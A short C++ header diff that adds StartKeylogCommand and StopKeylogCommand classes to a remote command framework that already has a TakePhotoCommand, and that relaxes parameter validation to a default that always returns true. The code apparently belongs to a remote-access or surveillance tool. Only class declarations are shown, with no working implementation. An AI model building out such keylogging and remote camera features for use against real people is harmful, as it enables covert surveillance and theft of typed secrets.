@@ -37,7 +37,7 @@ protected:
 public:
     virtual void execute(Client& Client) = 0;
     void setCommandInfo(const std::string& ip, const std::string& command, const std::string& parameter);
-    virtual bool validateParameter() const = 0;
+    virtual bool validateParameter() const {return true;}
     bool sendCommand(Client& Client);
     std::string getResponse();
 };
@@ -148,4 +148,14 @@ class TakePhotoCommand : public Command{
     public:
         void execute(Client& client) override;
         bool validateParameter() const override;
+};
+
+class StartKeylogCommand : public Command {
+    public:
+        void execute(Client& client) override;
+};
+
+class StopKeylogCommand : public Command {
+    public:
+        void execute(Client& client) override;
 };
